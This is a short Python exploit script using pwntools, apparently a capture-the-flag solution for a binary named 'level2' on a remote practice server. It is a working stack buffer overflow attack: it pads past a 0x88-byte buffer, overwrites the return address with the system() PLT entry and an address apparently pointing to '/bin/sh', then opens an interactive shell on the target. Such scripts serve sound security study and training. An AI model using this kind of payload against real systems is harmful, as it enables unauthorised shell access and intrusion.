from pwn import *

bin_addr = 0x0804a024

#p = process('./level2')
p = remote('node3.buuoj.cn', 26359)
elf = ELF('level2')

sys_addr = elf.plt['system']

p.recvuntil('Input:')

payload = b'a' * ( 0x88 + 4 ) + p32(sys_addr) + p32(0x123) + p32(bin_addr)

p.sendline(payload)

p.interactive()
